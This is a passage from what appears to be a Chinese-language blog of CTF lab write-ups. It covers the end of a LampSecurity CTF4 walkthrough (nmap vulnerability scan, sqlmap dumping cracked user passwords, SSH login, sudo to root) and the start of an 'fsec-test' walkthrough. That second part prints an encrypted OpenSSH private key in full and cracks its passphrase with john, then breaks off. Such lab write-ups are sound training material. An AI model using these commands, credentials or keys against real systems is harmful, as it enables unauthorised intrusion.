class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~/Documents/LampSecurityCTF4]<br>└─$ sudo nmap --script=vuln 192.168.80.170 -p22,80,25<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-20 14:27 CST<br>Stats: 0:00:21 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan<br>NSE Timing: About 66.67% <span class="hljs-keyword">done</span>; ETC: 14:27 (0:00:10 remaining)<br>Pre-scan script results:<br>| broadcast-avahi-dos:<br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.170<br>Host is up (0.00035s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>25/tcp open  smtp<br>| smtp-vuln-cve2010-4344:<br>|_  The SMTP server is not Exim: NOT VULNERABLE<br>80/tcp open  http<br>| http-slowloris-check:<br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-sql-injection:<br>|   Possible sqli <span class="hljs-keyword">for</span> queries:<br>|     http://192.168.80.170:80/?<span class="hljs-built_in">id</span>=7%27%20OR%20sqlspider&amp;page=blog&amp;title=Blog<br>|     http://192.168.80.170:80/?<span class="hljs-built_in">id</span>=5%27%20OR%20sqlspider&amp;page=blog&amp;title=Blog<br>|     http://192.168.80.170:80/?<span class="hljs-built_in">id</span>=2%27%20OR%20sqlspider&amp;page=blog&amp;title=Blog<br>|_    http://192.168.80.170:80/?<span class="hljs-built_in">id</span>=6%27%20OR%20sqlspider&amp;page=blog&amp;title=Blog<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-csrf:</span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.80.170</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities:</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://192.168.80.170:80/</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|     Form action: /index.html?page=search&amp;title=Search Results</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://192.168.80.170:80/index.html?page=contact&amp;title=Contact</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|     Form action: /index.html?page=search&amp;title=Search Results</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://192.168.80.170:80/index.html?page=blog&amp;title=Blog</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|     Form action: /index.html?page=search&amp;title=Search Results</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://192.168.80.170:80/index.html?page=search&amp;title=Search Results</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|     Form action: /index.html?page=search&amp;title=Search Results</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://192.168.80.170:80/index.html?page=research&amp;title=Research</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|     Form action: /index.html?page=search&amp;title=Search Results</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://192.168.80.170:80/index.html?title=Home Page</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|     Form action: /index.html?page=search&amp;title=Search Results</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://192.168.80.170:80/?page=blog&amp;title=Blog&amp;id=7</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|     Form action: /index.html?page=search&amp;title=Search Results</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://192.168.80.170:80/?page=blog&amp;title=Blog&amp;id=5</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|     Form action: /index.html?page=search&amp;title=Search Results</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://192.168.80.170:80/?page=blog&amp;title=Blog&amp;id=2</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|     Form action: /index.html?page=search&amp;title=Search Results</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://192.168.80.170:80/?page=blog&amp;title=Blog&amp;id=6</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|_    Form action: /index.html?page=search&amp;title=Search Results</span><br><span class="hljs-string">|_http-trace: TRACE is enabled</span><br><span class="hljs-string">| http-enum:</span><br><span class="hljs-string">|   /admin/: Possible admin folder</span><br><span class="hljs-string">|   /admin/index.php: Possible admin folder</span><br><span class="hljs-string">|   /admin/login.php: Possible admin folder</span><br><span class="hljs-string">|   /admin/admin.php: Possible admin folder</span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /icons/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.0 (fedora)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.0 (fedora)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /inc/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.0 (fedora)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /pages/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.0 (fedora)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /restricted/: Potentially interesting folder (401 Authorization Required)</span><br><span class="hljs-string">|   /sql/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.0 (fedora)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /usage/: Potentially interesting folder</span><br><span class="hljs-string">MAC Address: 00:0C:29:DF:AF:0F (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 168.56 seconds</span><br></code></pre></td></tr></table></figure><h3 id="访问web页面"><a href="#访问web页面" class="headerlink" title="访问web页面"></a>访问web页面</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221220155930858.png" alt="image-20221220155930858"></p><p>可以发现参数存在sql注入</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221220155957240.png" alt="image-20221220155957240"></p><h3 id="sqlmap梭哈"><a href="#sqlmap梭哈" class="headerlink" title="sqlmap梭哈"></a>sqlmap梭哈</h3><ul><li>–dbs 输出系统类型</li><li>–dump 榨取数据</li><li>–batch 自动化</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~/Documents/LampSecurityCTF4]<br>└─$ sqlmap -u <span class="hljs-string">&#x27;http://192.168.80.170/index.html?page=blog&amp;title=Blog&amp;id=1&#x27;</span> --dbs --dump --batch<br><br>+---------+-----------+--------------------------------------------------+<br>| user_id | user_name | user_pass                                        |<br>+---------+-----------+--------------------------------------------------+<br>| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |<br>| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |<br>| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |<br>| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |<br>| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |<br>| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |<br>+---------+-----------+--------------------------------------------------+<br></code></pre></td></tr></table></figure><p>在这里拿到了用户密码</p><h3 id="尝试ssh登录"><a href="#尝试ssh登录" class="headerlink" title="尝试ssh登录"></a>尝试ssh登录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~/Documents/LampSecurityCTF4]<br>└─$ ssh dstevens@192.168.80.170<br>Unable to negotiate with 192.168.80.170 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 <span class="hljs-comment"># 因为某些ssh版本原因这里提示说少了协议</span><br><br>┌──(neil㉿kali)-[~/Documents/LampSecurityCTF4]<br>└─$ ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.80.170<br>Unable to negotiate with 192.168.80.170 port 22: no matching host key <span class="hljs-built_in">type</span> found. Their offer: ssh-rsa,ssh-dss <span class="hljs-comment"># 这里提示说少了host key type</span><br><br>┌──(neil㉿kali)-[~/Documents/LampSecurityCTF4]<br>└─$ ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss  dstevens@192.168.80.170 <span class="hljs-comment"># 添加上这些参数就可以了连了</span><br>The authenticity of host <span class="hljs-string">&#x27;192.168.80.170 (192.168.80.170)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">RSA key fingerprint is SHA256:NDWh6/414mOsW4P7K6ICc5R67PrX87ADMFUx9DK9ftk.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.80.170<span class="hljs-string">&#x27; (RSA) to the list of known hosts.</span><br><span class="hljs-string">BSD SSH 4.1</span><br><span class="hljs-string">dstevens@192.168.80.170&#x27;</span>s password:<br>Last login: Wed Mar 11 09:45:34 2009<br>[dstevens@ctf4 ~]$<br></code></pre></td></tr></table></figure><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[dstevens@ctf4 ~]$ <span class="hljs-built_in">cat</span> /etc/passwd |grep /bin/bash<br>root:x:0:0:root:/root:/bin/bash<br>mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash<br>netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash<br>dstevens:x:500:506:Don Stevens:/home/dstevens:/bin/bash<br>achen:x:501:501:Andrew Chen:/home/achen:/bin/bash<br>pmoore:x:502:502:Phillip Moore:/home/pmoore:/bin/bash<br>jdurbin:x:503:503:James Durbin:/home/jdurbin:/bin/bash<br>sorzek:x:504:504:Sally Orzek:/home/sorzek:/bin/bash<br>ghighland:x:505:505:Greg Highland:/home/ghighland:/bin/bash<br>[dstevens@ctf4 ~]$ sudo -l<br>Password:<br>User dstevens may run the following commands on this host:<br>    (ALL) ALL<br>[dstevens@ctf4 ~]$ sudo -s<br>[root@ctf4 ~]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fsec-test-WP</title>
    <link href="/2022/11/25/fsec-test-WP/"/>
    <url>/2022/11/25/fsec-test-WP/</url>
    
    <content type="html"><![CDATA[<p>测试域名 <a href="http://www.fsec.io/">www.fsec.io</a></p><h1 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>通过ping确定目标ip为10.0.0.103</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125012049840.png" alt="image-20221125012049840"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>通过全端口的扫描发现目标系统仅开放了22和80端口</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125012416326.png"></p><h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><p>TCP端口扫描 <code>sudo nmap -sV -sC -O -p22,80 10.0.0.103</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125012717067.png" alt="image-20221125012717067"></p><p>为了防止开放了UDP端口</p><p>再通过UDP进行一遍端口扫描 <code>sudo nmap -sU -p22,80 10.0.0.103</code></p><p>很显然，没有开放的UDO端口</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125012842042.png" alt="image-20221125012842042"></p><p>使用Nmap自带的脚本进行简单漏扫</p><p><code>sudo nmap --script=vuln -p22,80 10.0.0.103</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125013201777.png" alt="image-20221125013201777"></p><p>通过简单的信息收集发现目标系统的web页面存在着<code>robots.txt</code></p><p>并且通过经验可以大致知道manual目录为apache的默认文档</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125013421392.png" alt="image-20221125013421392"></p><p>所以突破点暂时只能放在robots.txt</p><h3 id="访问web"><a href="#访问web" class="headerlink" title="访问web"></a>访问web</h3><p>访问首页没有发现什么有价值的信息，只有一张图片</p><p>还提醒我这个靶机不难，别放弃</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125014111234.png" alt="image-20221125014111234"></p><p>看了看这张图没发现有价值的信息</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125020226694.png" alt="image-20221125020226694"></p><p>访问robots.txt 在这里发现一个隐藏目录&#x2F;~myfiles</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125013543188.png" alt="image-20221125013543188"></p><p>访问&#x2F;~myfiles这个路径发现重定向了</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125014430476.png" alt="image-20221125014430476"></p><p>在这里跟随重定向发现返回了一个code为200的假404页面，并且通过注释提醒我继续尝试</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125014622889.png" alt="image-20221125014622889"></p><h3 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h3><p>使用dirb的默认字典对网站进行枚举</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125013858276.png" alt="image-20221125013858276"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125014000383.png" alt="image-20221125014000383"></p><p>通过使用默认字典对目录枚举后没有发现更多有价值的信息</p><p>卡了一段时间后，想了想会不会是因为有<code>～</code>的原因导致我啥也爆不出来</p><h3 id="自制字典"><a href="#自制字典" class="headerlink" title="自制字典"></a>自制字典</h3><p>使用seclists的&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-medium.txt为基础自制字典</p><p><code>sed &quot;s/^/\~&amp;/g&quot; directory-list-2.3-medium.txt &gt; my_wordlist.txt</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125015634283.png" alt="image-20221125015634283"></p><h3 id="再次枚举目录"><a href="#再次枚举目录" class="headerlink" title="再次枚举目录"></a>再次枚举目录</h3><p>在这里使用dirb等了快两分钟发现还在生成字典，果断放弃</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125015715456.png" alt="image-20221125015715456"></p><p>使用gobuster枚举</p><p><code>gobuster dir -u http://www.fsec.io -w my_wordlist.txt</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125020246835.png" alt="image-20221125020246835"></p><p>果然爆出了秘密信息</p><p>通过访问它发现这个人创建了一个ssh私钥并且把它藏起来了，并且还留了个人名<code>icex64</code></p><p>所以我只要找到它的私钥并且通过这个用户名使用私钥登录就能拿到一个shell了</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125020355143.png" alt="image-20221125020355143"></p><p>使用正常字典爆破发现没什么有价值的结果</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125020922853.png" alt="image-20221125020922853"></p><p>根据之前的套路以及它的提醒: “把这个ssh私钥藏起来了”</p><p>所以猜测这个私钥是隐藏文件，也就是<code>.</code>开头的</p><p> 继续自制字典爆破</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125021354812.png" alt="image-20221125021354812"></p><p>在这里发现一个看着就像的秘密文件<code>.mysecret.txt</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125021332807.png" alt="."></p><p>查看它发现一个像base64的编码后的数据</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125021540677.png" alt="image-20221125021540677"></p><h3 id="base解码"><a href="#base解码" class="headerlink" title="base解码"></a>base解码</h3><p>使用了base64解码后发现是乱码，丢到cyberchef里使用magic模块发现是base58</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125021739934.png" alt="image-20221125021739934"></p><p>解码后拿到私钥为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs awk">-----<span class="hljs-keyword">BEGIN</span> OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp<br>PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk<br><span class="hljs-number">9</span>GXiytplgT9z<span class="hljs-regexp">/mP91NqOU9QoAwop5JNxhEfm/</span>j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9<br>H6NSb0jMbMc4soFrBinoLEkx894B<span class="hljs-regexp">/PqUTODesMEV/</span>aK22UKegdwlJ9Arf+<span class="hljs-number">1</span>Y48V86gkzS6<br>xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7<br>J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0<span class="hljs-regexp">/nRfCaOrIzPfZ/</span>NNYgu<br>/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0<br>ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I<br>he0cLdyv316bFI8O+<span class="hljs-number">3</span>y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf<br>XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA<br>hzXJi4LGZ6mjaGEil+<span class="hljs-number">9</span>g4U7pjtEAqYv1+<span class="hljs-number">3</span>x8F+zuiZsVdMr/<span class="hljs-number">66</span>Ma4e6iwPLqmtzt3UiFGb<br><span class="hljs-number">4</span>Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq<br>mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp<br>MkMcBnzD9uynCjhZ9ijaPY<span class="hljs-regexp">/vMY7mtHZNCY8SeoWAxYXToKy2cu/</span>+pVyGQ76KYt3J0AT7wA<br><span class="hljs-number">2</span>OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG<span class="hljs-regexp">/b7z6zGvVxZca/g</span>572CXxXSXlb<br>QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+<span class="hljs-number">34</span>tK+kUoEaVAbwU+IchYyM8ZarSvHVpE<br>vFUPiANSHCZ<span class="hljs-regexp">/b+pdKQtBzTk5/</span>VH<span class="hljs-regexp">/Jk3QPcH69EJyx8/g</span>RE/glQY6z6nC6uoG4AkIl+gOxZ<br><span class="hljs-number">0</span>hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft<br>rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB<br>QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy<br>x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG<br>nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5<br>VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO<br>cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh<br>nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm<br><span class="hljs-number">8</span>UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+<span class="hljs-number">4</span>/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH<br>zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw<br>n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl<br>AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93<br>oVb4p<span class="hljs-regexp">/rHHqqPNMNwM1ns+adF7REjzFwr4/</span>trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI<br><span class="hljs-number">63</span>RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV<br>y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+<br>t<span class="hljs-regexp">/YYhQ/</span>r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2<br>Ays8pHGynylFMDTn13gPJTYJhLDO4H9+<span class="hljs-number">7</span>dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU<br>yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI<br><span class="hljs-number">8</span>nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU<br>mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+<span class="hljs-number">4</span>Qa4+oVk9ZluLBxeu22r<br>VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x<span class="hljs-regexp">/IUt/</span>FP8Nq964pD7m/dPHQ<br>E8<span class="hljs-regexp">/oh4V1NTGWrDsK3AbLk/</span>MrgROSg7Ic4BS/<span class="hljs-number">8</span>IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ<br>BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+<span class="hljs-number">31</span>qP80O/+Kk9NUWalsz+<span class="hljs-number">6</span>Kt2<br>yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+<br>wDSuOKenqc71GfvgmVOUypYTtoI527fiF/<span class="hljs-number">9</span>rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P<br><span class="hljs-number">5</span>KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8<br>vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ<br>Qb50sQsJUxKkuMyfvDQC9wyhYnH0/<span class="hljs-number">4</span>m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB<br><span class="hljs-number">1</span>bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB<br>ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/<span class="hljs-number">4</span>ORlsC<br>iUJ66WmRUN9EoVlkeCzQJwivI=<br>-----<span class="hljs-keyword">END</span> OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><h3 id="ssh私钥登录"><a href="#ssh私钥登录" class="headerlink" title="ssh私钥登录"></a>ssh私钥登录</h3><p><code>ssh -i id_key icex64@10.0.0.103</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125022235614.png" alt="image-20221125022235614"></p><p>发现还是被拒绝了，需要密码</p><h3 id="hash解密"><a href="#hash解密" class="headerlink" title="hash解密"></a>hash解密</h3><p><code>/usr/share/john/ssh2john.py id_key &gt; hash</code> 使用john自带脚本将ssh私钥转换为能解密的hash</p><p><code>john hash --wordlist=/usr/share/wordlists/fasttrack.txt</code>使用一个小字典直接跑出来了密码<code>P@55w0rd!</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125024854450.png" alt="image-20221125024854450"></p><h3 id="ssh公钥身份认证加密码登录"><a href="#ssh公钥身份认证加密码登录" class="headerlink" title="ssh公钥身份认证加密码登录"></a>ssh公钥身份认证加密码登录</h3><p>![image-20221125025554896](&#x2F;Users&#x2F;Neil&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20221125025554896.png)</p><p>成功拿到第一个flag</p><p>3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125025636296.png" alt="image-20221125025636296"></p><h2 id="权限提升1"><a 